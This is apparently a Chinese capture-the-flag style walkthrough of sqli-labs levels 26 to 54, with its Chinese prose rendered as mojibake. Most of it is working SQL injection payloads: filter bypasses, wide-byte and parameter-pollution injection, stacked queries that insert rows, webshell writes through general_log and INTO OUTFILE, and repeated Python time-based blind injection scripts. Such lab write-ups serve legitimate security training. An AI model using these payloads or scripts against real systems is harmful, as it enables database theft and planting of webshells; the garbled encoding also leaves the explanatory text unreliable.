        # id = "0 oorr if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
        tmp_url = url + "?id=" + id
        start = time.time()
        resp = requests.get(tmp_url)
        end = time.time()
        if end - start > 0.1:
            flag += s
            # å½“ç›²æ³¨å‡ºæ­£ç¡®å­—ç¬¦æ—¶ï¼Œæ‰å»ç›²æ³¨ä¸‹ä¸€ä½(å˜é‡içš„ä½œç”¨)
            i += 1
            print(f"[#]------result: {flag}")
            break
        elif end - start > 2:
            print("è·‘äº†è¿™ä¹ˆä¹…ï¼Œè·‘å®Œäº†å—ï¼Ÿè·‘å®Œæˆ‘ç»™ä½ åœäº†ğŸ¤“ğŸ‘")
            exit()
        else:
            pass
```

![52](/medias/sqli-labs/52.png)

## Less-26

é¢˜ç›®åç§°æç¤ºè¿‡æ»¤äº†ç©ºæ ¼ã€æ³¨é‡Šã€ä»¥åŠå‰é¢çš„`or`ã€`and`

å› ä¸ºæ˜¯getä¼ å‚ï¼Œè¿˜å¯ä»¥ä½¿ç”¨`%09`ã€`%0a`ã€`%0b`ã€`%0c`ã€`%0d`ã€`%a0`ç»•è¿‡

æˆ‘æµ‹ï¼Œé€šè¿‡æŠ¥é”™å‘ç°è¿™é‡Œçš„sqlè¯­å¥`'1'' LIMIT 0,1`ï¼Œæ˜¯å•å¼•å·åŒ…è£¹çš„id


å‘ç°è¿™é¢˜å¯ä»¥ç”¨`$0b`ï¼Œ`%a0`æ›¿æ¢ç©ºæ ¼

```sql
?id=0'union%0bselect%0b1,2,'3
```

çˆ†è¡¨ï¼Œæ³¨æ„å•è¯`information_schema`é‡Œæœ‰ä¸ª`or`ï¼Œä¹Ÿè¦åŒå†™

```sql
?id=0'union%0bselect%0b1,(select%0bgroup_concat(table_name)%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=database()),'3
```

## Less-26a

ç›¸æ¯”ä¸Šå…³ï¼Œæ·»åŠ äº†`()`åŒ…è£¹`id`ï¼Œå› ä¸ºä¸èƒ½ä½¿ç”¨æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥éœ€è¦è€ƒè™‘é—­åˆåï¼Œåé¢çš„`')`æ€ä¹ˆå¤„ç†


ä¹Ÿå¥½å¤„ç†ï¼Œå¯ä»¥`select 1,2,('3')`çš„å½¢å¼ï¼Œé—­åˆåé¢çš„`')`ï¼Œé¿å…è¯­æ³•é”™è¯¯æ— æ³•æ‰§è¡Œ

```sql
?id=0')union%0bselect%0b1,(select%0bgroup_concat(table_name)%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=database()),('3
```

![53](/medias/sqli-labs/53.png)

## Less-27

è¿‡æ»¤è¯­å¥ï¼Œè¿‡æ»¤ç©ºæ ¼ã€æ³¨é‡Šç¬¦ã€unionã€selectç­‰ï¼ŒæŠŠorã€andæ”¾å‡ºæ¥äº†

```php
$id= preg_replace('/[\/\*]/',"", $id);
$id= preg_replace('/[--]/',"", $id);
$id= preg_replace('/[#]/',"", $id);
$id= preg_replace('/[ +]/',"", $id);
$id= preg_replace('/select/m',"", $id);
$id= preg_replace('/[ +]/',"", $id);
$id= preg_replace('/union/s',"", $id);
$id= preg_replace('/select/s',"", $id);
$id= preg_replace('/UNION/s',"", $id);
$id= preg_replace('/SELECT/s',"", $id);
$id= preg_replace('/Union/s',"", $id);
$id= preg_replace('/Select/s',"", $id);
```

å¤§å°å†™æ··å†™ç»•è¿‡

```sql
?id=0'unIon%0bselEct%0b1,(seleCt%0bgroup_concat(table_name)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=database()),'3
```

![55](/medias/sqli-labs/55.png)

## Less-27a

åŒå¼•å·ç±»å‹ï¼Œå…¶ä»–ä¼¼ä¹éƒ½ä¸€æ ·


```sql
?id=0"%0bUnIon%0bSeLeCt%0b1,(seLect%0bgroup_concat(schema_name)%0bfrom%0binformation_schema.schemata),"3
```

![54](/medias/sqli-labs/54.png)

## Less-28

ä¸åŒºåˆ†å¤§å°å†™æ¥è¿‡æ»¤ï¼Œä¼šæŠŠ`union*select`ä¸åŒºåˆ†å¤§å°å†™çš„è¿‡æ»¤æ‰

```php
$id= preg_replace('/[\/\*]/',"", $id);
$id= preg_replace('/[--]/',"", $id);
$id= preg_replace('/[#]/',"", $id);
$id= preg_replace('/[ +]/',"", $id);
$id= preg_replace('/[ +]/',"", $id);
$id= preg_replace('/union\s+select/i',"", $id);
```

æµ‹è¯•å›æ˜¾æ¥åˆ¤æ–­åå°sqlè¯­å¥åº”è¯¥æ˜¯`')`åŒ…è£¹çš„

```sql
?id=0')%0bor%0b1=('1
```

![56](/medias/sqli-labs/56.png)


ç•¸å½¢åŒå†™ç»•è¿‡ï¼Œ`union`é‡Œå¥—ä¸€ä¸ª`union%0aselect`ï¼Œåˆ©ç”¨æ­£åˆ™åæ‰é‡Œé¢çš„`union\sselect`ï¼Œå¤ªå¥‡æ€ªäº†ï¼Œæ­£åˆ™`union\sselect`é‡Œçš„`\s`ä¸èƒ½åŒ¹é…`%0b`


```sql
?id=0')%0buniounion%0aselectn%0bselect%0b1,2,('3
```

![57](/medias/sqli-labs/57.png)

çˆ†åº“

```sql
?id=0')%0buniounion%0aselectn%0bselect%0b1,(select%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()),('3
```


## Less-28a

ç¿»é˜…æºç ï¼Œè¿‡æ»¤å‡å°‘äº†ã€‚æµ‹è¯•æ€è·¯åŒä¸Šé¢˜

```sql
?id=0')uNIounion%0aselectn%a0select%0a1,2,('3
```


## Less-29 HTTPå‚æ•°æ±¡æŸ“

æˆ‘å»ï¼Œè¿™å…³æœ‰æ„æ€ï¼Œå…ˆçœ‹çœ‹æºç 

æŠŠurlå‚æ•°idçš„å€¼èµ‹ç»™$query_stringï¼Œç„¶åä»¥&åˆ†å‰²æˆæ•°ç»„ï¼Œç„¶åå–idçš„å€¼

```php
// æŠŠurlå‚æ•°idçš„å€¼èµ‹ç»™$query_stringï¼Œç„¶åä»¥&åˆ†å‰²æˆæ•°ç»„ï¼Œç„¶åå–idçš„å€¼
function java_implimentation($query_string)
{
	$q_s = $query_string;
	$qs_array= explode("&",$q_s);
	foreach($qs_array as $key => $value)
	{
		$val=substr($value,0,2);
		if($val=="id")
		{
			$id_value=substr($value,3,30); 
			return $id_value;
			echo "<br>";
			break;
		}
	}
}
```

æµ‹è¯•ï¼šå°è¯•ä¼ å…¥`?id=1&id=2`ï¼Œå¯ä»¥å‘ç°é¡µé¢æ˜¾ç¤ºçš„ç”¨æˆ·åä¸å†æ˜¯`Dumb`ï¼Œè€Œå®`Angelina`

è¿™å…³ login.php è®¾ç½®äº†ä¸€ä¸ªç™½åå•WAFï¼Œåªå…è®¸æ•°å­—ï¼Œä¸è¿‡è·å–åŒ¹é…çš„å‚æ•° $_SERVER['QUERY_STRING'] ç„¶ååŒ¹é…åˆ°ç¬¬ä¸€ä¸ª id å°± break æ‰äº†ã€‚ä½† PHP é€šè¿‡ $_GET['id'] è·å–æ˜¯è¦†ç›–å…³ç³»ï¼Œå³åŒæ—¶å­˜åœ¨å¤šä¸ªURLå‚æ•°æ—¶ï¼Œåªè·å–æœ€åä¸€ä¸ªã€‚ä½†WAFåˆ¤æ–­çš„æ˜¯ç¬¬1ä¸ªï¼Œæ‰€ä»¥å°±å¯ä»¥ç»•è¿‡äº†ã€‚è¿™ç§æ–¹å¼ä¹Ÿå«HPPï¼ŒHTTP å‚æ•°æ±¡æŸ“

```sql
?id=1&id=0'union select 1,2,3%23
```

![58](/medias/sqli-labs/58.png)

## Less-30

åŒä¸Šå…³æœ‰äº›ä¸åŒï¼Œéœ€è¦åœ¨æ–°çš„å‚æ•°`id`é‡Œè¿›è¡ŒåŸsqlè¯­å¥çš„é—­åˆæµ‹è¯•

è¿™é¢˜æ˜¯åŒå¼•å·ç±»å‹

```sql
?id=1&id=0"union select 1,2,3%23
```

![59](/medias/sqli-labs/59.png)


## Less-31

æµ‹è¯•é—­åˆåŸsqlè¯­å¥

```sql
?id=1&id=0")union select 1,2,3%23
```

![60](/medias/sqli-labs/60.png)

## Less-32 å®½å­—èŠ‚æ³¨å…¥

æºç é‡Œï¼Œé€šè¿‡è½¬ä¹‰è¿‡æ»¤äº†ä¼ å…¥çš„å•åŒå¼•å·ï¼Œé¿å…æ‹¼æ¥åˆ°sqlè¯­å¥é‡Œæˆä¸ºé—­åˆç¬¦

```php
function check_addslashes($string)
{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);
    $string = preg_replace('/\'/i', '\\\'', $string);   
    $string = preg_replace('/\"/', "\\\"", $string);
    return $string;
}
```

é€šè¿‡è½¬ä¹‰æ¥å®ç°è¿‡æ»¤å•åŒå¼•å·çš„å®‰å…¨æªæ–½ï¼Œå¯ä»¥å®½å­—èŠ‚æ³¨å…¥ç»•è¿‡ï¼Œå¼•ç”¨`mysqlæ³¨å…¥å¤©ä¹¦`ä½œè€…å¯¹å®½å­—èŠ‚æ³¨å…¥çš„è§£é‡Š

![61](/medias/sqli-labs/61.png)



```sql
?id=1%df'
```

![62](/medias/sqli-labs/62.png)


ä¼ å…¥idåï¼Œå•å¼•å·è¢«è½¬ä¹‰`\'`ï¼Œåœ¨mysqlä½¿ç”¨gbkç¼–ç æ—¶ï¼Œä¸¤ä¸ªå­—èŠ‚ä½œä¸ºä¸€ä¸ªæ±‰å­—ï¼Œåœ¨`%df`é‡åˆ°`%5c`æ—¶ï¼Œä¼šæŠŠ`%df%5c`çœ‹ä½œä¸€ä¸ªæ±‰å­—`é‹`ï¼Œåæ‰äº†`%5c`çš„è½¬ä¹‰ä½œç”¨ï¼Œç»•è¿‡äº†è¿‡æ»¤

![63](/medias/sqli-labs/63.png)

å‘ç°sqlè¯­å¥è½¬æ¢16è¿›åˆ¶æ—¶ï¼Œè½¬ä¹‰å­—ç¬¦`\`è¢«ç³»ç»Ÿåƒäº†ï¼Œé€†å¤©ï¼Œè¡¥ä¸€ä¸ª5c

å‰é¢åšé¢˜å¤šäº†ï¼Œå¯ä»¥çŸ¥é“å•å¼•å·æ˜¯`27`ï¼Œæ‰¾åˆ°ä¸¤ä¸ª27å¤§æ¦‚å°±æ˜¯è¦æ‰¾çš„å•å¼•å·ï¼Œè¡¥ä¸€ä¸ª`5c`

![65](/medias/sqli-labs/65.png)

è¡¥å……`df`ï¼Œçœ‹`df5c`çš„æ•ˆæœ

![64](/medias/sqli-labs/64.png)


ç°åœ¨å¯ä»¥çŸ¥é“ï¼Œ`0xdf`å’Œ`0x5c`ä¸¤ä¸ªå­—èŠ‚åœ¨ä¸€èµ·ä¼šè§£é‡Šä¸ºä¸€ä¸ªæ±‰å­—`é‹`ã€‚åœ¨urlå°±æ˜¯`%df`ã€`%5c`

ç›´æ¥é«˜å¼ºåº¦æ—¥ç«™

```sql
?id=0%df'union select 11,22,(select group_concat(table_name) from information_schema.tables where table_schema=database())%23
```

![66](/medias/sqli-labs/66.png)

## Less-33

å’Œä¸Šé¢˜æœ‰åŒºåˆ«å—ï¼Ÿå¥½åƒæ²¡æœ‰ï¼ŒåŒºåˆ«æ˜¯ä¸Šå…³æ˜¯å‡ºé¢˜äººè‡ªå·±å®šä¹‰ä¸€ä¸ªè½¬ä¹‰å‡½æ•°ï¼Œè¿™é‡Œä½¿ç”¨è‡ªå¸¦çš„`addslashes`å‡½æ•°

```sql
?id=0%df' union select 1,2,3%23
```

![67](/medias/sqli-labs/67.png)


## Less-34 POST

è¿™é“é¢˜ä½¿ç”¨postæ–¹å¼æäº¤å‚æ•°ï¼Œç”¨bpæŠ“åŒ…æäº¤

```sql
uname=0%df'union%20select%20version(),user()%23&passwd=1'&submit=Submit
```

![68](/medias/sqli-labs/68.png)


## Less-35

æç¤ºæ•´å‹æ³¨å…¥ï¼Œå¥½åƒä»€ä¹ˆè¿‡æ»¤ä¹Ÿæ²¡æœ‰ï¼Ÿ

![69](/medias/sqli-labs/69.png)


## Less-36

é¢˜ç›®æç¤º`bypass mysql_real_escape_string`ï¼Œç»•è¿‡`mysql_real_escape_string`å‡½æ•°

åœ¨`mysqlæ³¨å…¥å¤©ä¹¦`é‡Œï¼Œä½œè€…æåˆ°

![70](/medias/sqli-labs/70.png)

```sql
?id=0%df'union select 1,2,3%23
```


å¦‚æœè¦é˜²èŒƒ`MYSQL_real_escape_string`ï¼Œéœ€è¦æŠŠmysqlè®¾ç½®ä¸º`gbk`ç¼–ç ï¼Œé‚£ä¹ˆè¯´ï¼Œégbkç¼–ç æ—¶ï¼Œ`mysql_real_escape_string`å‡½æ•°ä¼šåƒä¸Šé¢`addslashes`ä¸€æ ·ï¼Œè½¬ä¹‰ä½†å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ï¼Ÿ

ç¿»çœ‹æºç ï¼Œå‘ç°ï¼Œè¿™é¢˜ä½¿ç”¨çš„å°±æ˜¯`gbk`ç¼–ç ï¼Ÿï¼Ÿï¼Ÿ

![71](/medias/sqli-labs/71.png)

## Less-37

æˆ‘å…¥


```sql
uname=1%df'%20or%201=1%23&passwd=1&submit=Submit
```


![72](/medias/sqli-labs/72.png)


ğŸ¤¯ è½¬ä¹‰çš„å°½å¤´æ˜¯`%df`å—ï¼Ÿ


## Less-38 å †å æ³¨å…¥

è€å¤©å¥¶ï¼Œç»ˆäºåˆ°ä¸‹ä¸€ä¸ªé¡µé¢äº†ï¼Œå †å æ³¨å…¥

::: tip 
oracle ä¸èƒ½ä½¿ç”¨å †å æ³¨å…¥ï¼Œmysqlã€sqlserverã€postgresql éƒ½å¯ä»¥
:::


ä¸€ç›´æ²¡æœ‰äº†è§£ä¸ºä»€ä¹ˆæœ‰æ—¶å€™åªèƒ½è”åˆæ³¨å…¥ï¼Œæœ‰æ—¶å€™ç”šè‡³å¯ä»¥å¯¹å †å æ³¨å…¥ï¼Œå­¦ä¹ ä¸‹æºç 

ä¹‹å‰çš„æ³¨å…¥æ‰§è¡Œè¯­å¥

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
```

è¿™é¢˜çš„å †å æ³¨å…¥è¯­å¥

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
/* execute multi query */
if (mysqli_multi_query($con1, $sql))
```

ç›¸æ¯”ï¼ŒåŸæ¥è¿™é‡Œçš„`mysqli_multi_query`å‡½æ•°ï¼Œå¯ä»¥æ‰§è¡Œå¤šæ¡sqlè¯­å¥ï¼Œæ‰€ä»¥å¯ä»¥å †å æ³¨å…¥ğŸ¤¯

è”åˆæŸ¥è¯¢å°±å¥½åƒå°±å¤Ÿç”¨äº†ï¼Œæˆ‘æ‹¿å †å æ³¨å…¥æœ‰ä»€ä¹ˆæ–°å§¿åŠ¿ï¼Ÿ

ç»™ç«™é•¿ç•™æ¡æ•°æ®â˜ğŸ¤“

```sql
?id=0' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database())%23
?id=0' union select 1,2,(select group_concat(id,username,password) from users)%23
?id=0';insert into users values(100,'imsb',22);%23
```

![75](/medias/sqli-labs/75.png)

å †å æ³¨å…¥æ˜¯ä¸æ˜¯å¯ä»¥æ‰§è¡Œä»»æ„sqlè¯­å¥

æ‰“å¼€æ—¥å¿—è®°å½•ï¼Œä¿®æ”¹æ—¥å¿—æ–‡ä»¶ã€ç›®å½•ï¼ŒæŸ¥è¯¢æ¶æ„å­—ç¬¦ä¸²å†™å…¥æ—¥å¿—

```sql
?id=0';set global general_log='on';set global general_log_file='/var/www/html/Less-38/4.php';select 1,2, 0x3c3f3d706870696e666f28293b3f3e;%23
```

æˆ‘æµ‹ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆå†™è¿›å»æ²¡æœ‰è§£æğŸ¤¯

è®°å½•ä¸€ä¸‹ï¼Œsqlå †å æ³¨å…¥é€šè¿‡æ—¥å¿—å†™å…¥æœ¨é©¬æµç¨‹

```sql
# æ‰“å¼€æ—¥å¿—è®°å½•
set global general_log='on';
# è®¾ç½®æ—¥å¿—æ–‡ä»¶
set global general_log_file='/var/www/html/Less-38/4.php';
# å†™å…¥æ¶æ„å­—ç¬¦ä¸²
select 1,2, 0x3c3f3d706870696e666f28293b3f3e;
```

## Less-39

æ•´å‹æ³¨å…¥ï¼Œå°è¯•æ—¥å¿—å†™é©¬å­è¿˜æ˜¯å¤±è´¥äº†

```sql
?id=0;set global general_log='on';set global general_log_file='/var/www/html/Less-39/1.php';select 1,2, 0x3c3f3d706870696e666f28293b3f3e;%23
```


æˆ‘ç›´æ¥è¿›å®¹å™¨è°ƒè¯•

ç ´æ¡ˆï¼Œmysqlå†™çš„æ–‡ä»¶æ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œæˆ‘ç›´æ¥ä¸€ä¸ªé«˜æƒé™æˆ˜å£«

```bash
docker exec -it sqli-lab /bin/sh
chmod 777 /var/www/html/Less-39/*.php
```

![76](/medias/sqli-labs/76.png)

è¿™åˆæ˜¯ä»€ä¹ˆå¥‡æ€ªçš„æŠ¥é”™ ğŸ¤¯

![77](/medias/sqli-labs/77.png)

é‡æ–°å†™è¯•è¯•ï¼Œè¿˜æ˜¯ä¸è¡Œï¼Œå¼€æºœï¼

```sql
?id=0;select '<?=phpinfo();?>' into outfile '/var/www/html/Less-39/2.php';
```

![78](/medias/sqli-labs/78.png)

## Less-40

é€šè¿‡é¡µé¢å›æ˜¾å¯ä»¥æµ‹è¯•å‡ºåå°idæ˜¯`')`åŒ…è£¹çš„

```sql
?id=1');
```

çœ‹`mysqlæ³¨å…¥å¤©ä¹¦`ä½œè€…åœ¨ç»å¸¸ä½¿ç”¨`insert`è¯­å¥ï¼Œå¤šç”¨ç†Ÿæ‚‰ä¸€ä¸‹

```sql
?id=0');insert into users values(101,'imsb',666);%23
```

![79](/medias/sqli-labs/79.png)

## Less-41

æ•´å‹æ³¨å…¥

```sql
?id=1;insert into users values(103,'Jay','');%23
```

![80](/medias/sqli-labs/80.png)

## Less-42

æŸ¥çœ‹æºç ï¼Œé¢˜ç›®åœ¨ç™»å½•çš„å¤„ç†æ–¹é¢ï¼Œå¯¹`username`åšäº†è¿‡æ»¤ï¼Œ`password`æ²¡æœ‰è¿‡æ»¤

![81](/medias/sqli-labs/81.png)


```sql
login_password=1' or 1=1;select '<?=phpinfo();?>' into outfile '/var/www/html/Less-42/1.php';%23&login_user=admin&mysubmit=Login
```

![82](/medias/sqli-labs/82.png)


## Less-43

æŸ¥çœ‹æºç ï¼Œæ•´ä½“é€»è¾‘æ²¡å˜ï¼Œå‚æ•°çš„æ‹¼æ¥æ–¹å¼æ¢æˆäº†`('')`åŒ…è£¹äº†

![83](/medias/sqli-labs/83.png)

```sql
login_password=1') or 1=1;select '<?=phpinfo();?>' into outfile '/var/www/html/Less-43/1.php';%23&login_user=admin&mysubmit=Login
```

![84](/medias/sqli-labs/84.png)


## Less-44


ç™»å½•å¤„ç†è¿˜æ˜¯æ²¡æœ‰ä¿®å¤

![85](/medias/sqli-labs/85.png)


```sql
login_password=1' or 1=1;select '<?=phpinfo();?>' into outfile '/var/www/html/Less-44/1.php';%23&login_user=admin&mysubmit=Login
```

## Less-45

æ¼æ´æµ‹è¯•å˜æˆä»£ç å®¡è®¡äº†ï¼ˆxï¼‰ï¼Œä¸æƒ³æŒ¨ä¸ªæµ‹äº†ï¼Œæˆ‘ç›´æ¥çœ‹æºç 

![86](/medias/sqli-labs/86.png)


```sql
login_password=1') or 1=1;select '<?=phpinfo();?>' into outfile '/var/www/html/Less-45/1.php';%23&login_user=admin&mysubmit=Login
```

## Less-46 order byæ³¨å…¥

order byæ³¨å…¥ï¼Œä¸¾ä¾‹æºç 

```php
$sql = "SELECT * FROM users ORDER BY $id";
$result = mysql_query($sql);
```

### order by + æ•°å­—

order byåçš„å‚æ•°idå¯ä»¥ä½œä¸ºä¸€ä¸ªæ³¨å…¥ç‚¹ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨`?sort=1 desc`ã€`?sort=1 asc`ï¼Œæ¥æ£€æµ‹order byåèƒ½ä¸èƒ½æ‹¼æ¥å‚æ•°ï¼Œæ„é€ ä¸€äº›sqlè¯­å¥ï¼Œçˆ†å‡ºæ•°æ®

```sql
?sort=1 desc
?sort=1 asc
```

å°è¯•æŠ¥é”™æ³¨å…¥

```sql
?sort=updatexml(1,concat(0x7e,,0x7e),1)
?sort=extractvalue(1,concat(0x7e,0x7e))
```

![87](/medias/sqli-labs/87.png)

![88](/medias/sqli-labs/88.png)


æ—¶é—´ç›²æ³¨ï¼Œé¡µé¢è¿›å…¥åŠ è½½çŠ¶æ€

```sql
?sort=if(1=1,sleep(5),sleep(5))
```

![89](/medias/sqli-labs/89.png)

å†™ä¸ªæ—¶é—´ç›²æ³¨è„šæœ¬

```python
import requests
import string
import time
# ä¸‹åˆ’çº¿æ”¾æœ€åï¼Œé¿å…å½“ä½œç»Ÿé…ç¬¦åƒæ‰ç‰¹æ®Šå­—ç¬¦
flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
flag = ""

url = "http://127.0.0.1:8080/Less-46/"
i = 1
print("è„šæœ¬æ­£åœ¨è¿è¡Œ.......")
while True:
    
    for s in flags:
        # çˆ†åº“
        sort = "if((substr((select group_concat(schema_name) from information_schema.schemata)," + str(i)+",1)='"+ s +"'),sleep(0.1),0)"
        # çˆ†è¡¨
        # sort = "if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
        # çˆ†å­—æ®µ
        # sort = "if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
        tmp_url = url + "?sort=" + sort
        start = time.time()
        resp = requests.get(tmp_url)
        end = time.time()
        if end - start > 0.1:
            flag += s
            # å½“ç›²æ³¨å‡ºæ­£ç¡®å­—ç¬¦æ—¶ï¼Œæ‰å»ç›²æ³¨ä¸‹ä¸€ä½(å˜é‡içš„ä½œç”¨)
            i += 1
            print(f"[#]------result: {flag}")
            break
        elif end - start > 2:
            print("è·‘äº†è¿™ä¹ˆä¹…ï¼Œè·‘å®Œäº†å—ï¼Ÿè·‘å®Œæˆ‘ç»™ä½ åœäº†ğŸ¤“ğŸ‘")
            exit()
        else:
            pass
```

![90](/medias/sqli-labs/90.png)


### order by + æ•°å­— + procedure analyse(payload,æ•°å­—)

```sql
?sort=1 procedure analyse(updatexml(1,concat(0x7e,user(),0x7e),1),  )
```


![91](/medias/sqli-labs/91.png)


### order by + æ•°å­— + into outfile 'æ–‡ä»¶è·¯å¾„'

æŠŠæŸ¥è¯¢ç»“æœå†™å…¥æ–‡ä»¶

```sql
?sort=1 into outfile '/var/www/html/Less-46/1.php'
```

![92](/medias/sqli-labs/92.png)

èƒ½å†™é©¬å­å—ï¼Ÿå¥½åƒå¯ä»¥çš„ï¼Œä½¿ç”¨`lines terminated by`æ¥ç»™å†™å…¥çš„å†…å®¹æ¯ä¸€è¡Œæœ«å°¾æ·»åŠ è‡ªå®šä¹‰å†…å®¹ï¼ï¼ğŸ¤¯


```sql
?sort=1 into outfile '/var/www/html/Less-46/2.php' lines terminated by 0x3c3f3d706870696e666f28293b3f3e
```


![93](/medias/sqli-labs/93.png)


## Less-47

åˆ©ç”¨order by æ•°å­—æ³¨å…¥

åŸæ¥order byä¹Ÿå¯ä»¥`order by '0' or 1=1`è¿™æ ·

```sql
?sort=0' or updatexml(0x7e,version(),0x7e)%23
```

![94](/medias/sqli-labs/94.png)


order by + æ•°å­— + procedure analyse(payload,æ•°å­—)

```sql
?sort=0 procedure analyse(updatexml(0x7e,version(),0x7e),14514)%23
```

![95](/medias/sqli-labs/95.png)


order by + æ•°å­— + into outfile 'æ–‡ä»¶è·¯å¾„'

```sql
?sort=0' into outfile '/var/www/html/Less-47/1.php'  lines terminated by 0x3c3f3d706870696e666f28293b3f3e%23
```

![96](/medias/sqli-labs/96.png)


## Less-48

è¿™é“é¢˜æµ‹è¯•åå°è¯­æ³•æ²¡æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œç›´æ¥è¯•æ—¶é—´ç›²æ³¨

```sql
?sort=if(1=1,sleep(5),sleep(5))%23
```

![97](/medias/sqli-labs/97.png)

è„šæœ¬æ¢­å“ˆ

```python
import requests
import string
import time
# ä¸‹åˆ’çº¿æ”¾æœ€åï¼Œé¿å…å½“ä½œç»Ÿé…ç¬¦åƒæ‰ç‰¹æ®Šå­—ç¬¦
flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
flag = ""

url = "http://127.0.0.1:8080/Less-48/"
i = 1
print("è„šæœ¬æ­£åœ¨è¿è¡Œ.......")
while True:
    
    for s in flags:
        # çˆ†åº“
        sort = "if((substr((select group_concat(schema_name) from information_schema.schemata)," + str(i)+",1)='"+ s +"'),sleep(0.1),0)"
        # çˆ†è¡¨
        # sort = "if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
        # çˆ†å­—æ®µ
        # sort = "if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
        tmp_url = url + "?sort=" + sort
        start = time.time()
        resp = requests.get(tmp_url)
        end = time.time()
        if end - start > 0.1:
            flag += s
            # å½“ç›²æ³¨å‡ºæ­£ç¡®å­—ç¬¦æ—¶ï¼Œæ‰å»ç›²æ³¨ä¸‹ä¸€ä½(å˜é‡içš„ä½œç”¨)
            i += 1
            print(f"[#]------result: {flag}")
            break
        elif end - start > 2:
            print("è·‘äº†è¿™ä¹ˆä¹…ï¼Œè·‘å®Œäº†å—ï¼Ÿè·‘å®Œæˆ‘ç»™ä½ åœäº†ğŸ¤“ğŸ‘")
            exit()
        else:
            pass
```

![98](/medias/sqli-labs/98.png)


å†™ä¸ªé©¬å­

```sql
?sort=1 into outfile '/var/www/html/Less-48/1.php' lines terminated by 0x3c3f3d706870696e666f28293b3f3e%23
```



## Less-49

æ—¶é—´ç›²æ³¨çŒœé—­åˆæ–¹å¼

```sql
?sort=0' or if(1=1,sleep(5),sleep(5))%23
```


![99](/medias/sqli-labs/99.png)

çŒœå‡ºåå°é—­åˆæ–¹å¼å¯ä»¥ç›´æ¥æ”¹è„šæœ¬äº†ï¼Œæˆ–è€…å†™ä¸ªé©¬å­è¿›å»


```sql
?sort=0' into outfile '/var/www/html/Less-49/1.php' lines terminated by 0x3c3f3d706870696e666f28293b3f3e%23
```

![100](/medias/sqli-labs/100.png)


## Less-50

æ—¶é—´ç›²æ³¨çŒœå‡ºåå°æ˜¯ï¼Œæ•´æ•°å‹

![101](/medias/sqli-labs/101.png)

æ€ä¹ˆè·Ÿ`Less-48`ä¸€æ ·ï¼Ÿç¿»çœ‹æºç ï¼Œå‘ç°è¿™é“é¢˜å¯ä»¥å †å æ³¨å…¥äº†

![102](/medias/sqli-labs/102.png)

```sql
?sort=1;select '<?php phpinfo();?>' into outfile'/var/www/html/Less-50/1.php'%23
```

## Less-51

æ—¶é—´ç›²æ³¨çŒœå‡ºåå°æ˜¯ï¼Œå•å¼•å·ç±»å‹

```sql
?sort=0' or if(1=1,sleep(5),sleep(5))%23
```

![103](/medias/sqli-labs/103.png)


æœ«å°¾å†™é©¬ã€å †å å†™é©¬ã€ç›²æ³¨

```sql
?sort=0' into outfile '/var/www/html/Less-51/1.php' lines terminated by 0x3c3f3d706870696e666f28293b3f3e%23
```

```sql
?sort=0';select '<?php phpinfo();?>' into outfile'/var/www/html/Less-51/1.php'%23
```

## Less-52

æ—¶é—´ç›²æ³¨çŒœå‡ºåå°æ˜¯ï¼Œæ•´å‹

```sql
?sort=0 or if(1=1,sleep(5),sleep(5))%23
```

æœ«å°¾å†™é©¬ã€å †å å†™é©¬ã€ç›²æ³¨


å‘ç°ä¸ªå°é—®é¢˜ï¼Œå‰é¢`Less-51`å†™é©¬çš„æ—¶å€™ï¼Œå­—ç¬¦å‹`order by '0'`æˆåŠŸå†™é©¬ï¼Œè¿™é“é¢˜æ•´æ•°å‹`order by 0`å°±å¤±è´¥äº†ï¼Œæ¢æˆ`order by 1`å¯ä»¥æ­£å¸¸å†™å…¥

```sql
?sort=1 into outfile '/var/www/html/Less-52/1.php' lines terminated by 0x3c3f3d706870696e666f28293b3f3e%23
```

```sql
?sort=1;select '<?php phpinfo();?>' into outfile'/var/www/html/Less-52/1.php'%23
```

## Less-53

æ—¶é—´ç›²æ³¨æµ‹è¯•å‡ºåå°æ˜¯ï¼Œå•å¼•å·ç±»å‹

```sql
?sort=0' or if(1=1,sleep(5),sleep(5))%23
```

æœ«å°¾å†™é©¬ã€å †å å†™é©¬ã€ç›²æ³¨

```sql
?sort=0' into outfile '/var/www/html/Less-53/1.php' lines terminated by 0x3c3f3d706870696e666f28293b3f3e%23
```

```sql
?sort=0';select '<?php phpinfo();?>' into outfile'/var/www/html/Less-53/1.php'%23
```


## Less-54 


è€å¤©å¥¶ï¼Œç»ˆäºåˆ°page 4äº†

::: tip
The objective of this challenge is to dump the (secret key) from only random table from Database ('CHALLENGES') in Less than 10 attempts
For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.
:::

åœ¨æŒ‘æˆ˜æ¬¡æ•°å°äº10æ¬¡æ—¶ï¼Œæ•°æ®åº“`CHALLENGES`ä¼šæ ¹æ®å¯†é’¥ç”Ÿæˆéšæœºè¡¨ï¼Œè¶…è¿‡10æ¬¡ï¼Œä¼šæ ¹æ®å¯†é’¥ç”Ÿæˆéšæœºè¡¨ï¼Œéšæœºåˆ—ï¼Œéšæœºæ•°æ®

